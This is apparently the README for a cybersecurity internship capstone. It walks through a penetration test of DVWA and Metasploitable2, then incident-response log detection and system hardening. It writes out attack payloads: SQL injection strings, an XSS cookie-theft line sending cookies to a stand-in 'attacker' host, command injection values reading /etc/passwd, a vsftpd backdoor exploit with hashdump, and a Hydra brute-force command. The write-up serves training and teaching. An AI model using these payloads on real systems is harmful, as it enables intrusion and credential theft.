# 🏆 Task 5 — Capstone Project & Incident Response
> **ApexPlanet Cybersecurity Internship | Days 49–60 | FINAL TASK**

![Task](https://img.shields.io/badge/Task-5%20FINAL-gold)
![Type](https://img.shields.io/badge/Type-Web%20App%20Pentest-red)
![Status](https://img.shields.io/badge/Status-In%20Progress-orange)
![Internship](https://img.shields.io/badge/Internship-ApexPlanet-teal)

---

## 📌 Objective
Apply ALL skills learned across Tasks 1–4 in a comprehensive **Web Application Penetration Test** on DVWA/Metasploitable2, simulate an incident response, and deliver a professional-grade capstone report.

---

## 🎯 Capstone Type Selected
**Web Application Pentest Report** on DVWA (Damn Vulnerable Web Application) + Metasploitable2

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap -A -sV` | Reconnaissance & port scanning |
| `nikto` | Web vulnerability scanner |
| `Burp Suite` | HTTP interception & fuzzing |
| `Metasploit` | Exploitation framework |
| `Hydra` | SSH brute force |
| `John the Ripper` | Password hash cracking |
| `Wireshark` | Packet capture & analysis |
| `OpenVAS` | Vulnerability scanning |
| `iptables / UFW` | Firewall & containment |
| `Apache logs` | Incident detection |

---

## 🔴 Vulnerabilities Found

| Vulnerability | Severity | CVE | OWASP |
|--------------|----------|-----|-------|
| vsftpd 2.3.4 Backdoor | 🔴 Critical | CVE-2011-2523 | A06 - Vulnerable Components |
| SQL Injection | 🔴 Critical | — | A03 - Injection |
| Command Injection | 🔴 Critical | — | A03 - Injection |
| Samba RCE | 🔴 Critical | CVE-2007-2447 | A06 - Vulnerable Components |
| Stored XSS | 🔴 Critical | — | A07 - XSS |
| CSRF | 🟠 High | — | A01 - Broken Access |
| LFI / RFI | 🟠 High | — | A05 - Misconfiguration |
| Broken Auth | 🟠 High | — | A07 - Auth Failure |

---

## 📋 Full Attack Chain

### 1. 🔍 Reconnaissance
```bash
nmap -A -sV -O [target-ip] -oN nmap_capstone.txt
nikto -h http://[target-ip]/dvwa
whois [domain]
```

### 2. 💉 SQL Injection
```bash
# Bypass
' OR '1'='1

# Dump credentials
1' UNION SELECT user,password FROM users-- -

# John the Ripper — crack MD5 hashes
john dvwa_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
john dvwa_hashes.txt --show --format=Raw-MD5
```

### 3. ⚡ XSS
```html
<!-- Stored XSS -->
<script>alert('Capstone XSS!')</script>
<!-- Cookie theft simulation -->
<script>document.location='http://attacker/steal?c='+document.cookie</script>
```

### 4. 💻 Command Injection
```bash
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1; id; uname -a
```

### 5. 💥 Metasploit Exploitation
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS [target-ip]
run
# Post-exploitation
sysinfo && hashdump && getuid
```

### 6. 🔑 Password Attacks
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://[target-ip]
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 7. 🚨 Incident Response
```bash
# Detect SQLi in logs
grep -i 'union\|select\|or 1=1' /var/log/apache2/access.log

# Detect brute force
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Containment
sudo iptables -A INPUT -s [attacker-ip] -j DROP
sudo systemctl disable vsftpd telnet
```

### 8. 🛡️ System Hardening
```bash
sudo apt update && sudo apt upgrade -y
sudo ufw enable && sudo ufw default deny incoming
sudo ufw allow 22/tcp
sudo systemctl disable vsftpd telnet rsh
find / -perm -4000 -type f 2>/dev/null  # SUID check
```

---

## 📁 Repository Structure

```
apexplanet-cybersecurity-internship/
├── README.md
├── linux-cheatsheet.md
├── Lab_Setup_Report_Task1.docx
├── Task-2/
├── Task-3/
├── Task-4/
└── Task-5-Capstone/
    ├── README.md                    ← This file
    ├── Capstone_Report_Task5.docx   ← Full pentest report
    ├── Task5_VideoScript_LinkedIn.md
    ├── nmap_capstone.txt            ← Raw Nmap output
    ├── incident-response/
    │   ├── post-incident-report.md
    │   └── containment-steps.md
    └── screenshots/
        ├── nmap-scan.png
        ├── sqli-dump.png
        ├── command-injection.png
        ├── metasploit-shell.png
        ├── hashdump.png
        ├── john-cracked.png
        ├── wireshark-capture.png
        ├── log-detection.png
        └── iptables-block.png
```

---

## ✅ Final Deliverables

- [ ] Capstone Project Report (with all screenshots)
- [ ] GitHub Repo with scripts, notes, methodology ← *This repo*
- [ ] 12-min Final Presentation Video
- [ ] Final Submission: Report + GitHub + Video Link

---

## ⚠️ Disclaimer
> All attacks performed **exclusively on DVWA and Metasploitable2 in a private isolated lab.** Never use these techniques on systems without explicit written authorization.

---

*ApexPlanet Software Pvt. Ltd. | Cybersecurity & Ethical Hacking Internship | SYEDMAHAMMEDAFZAL*
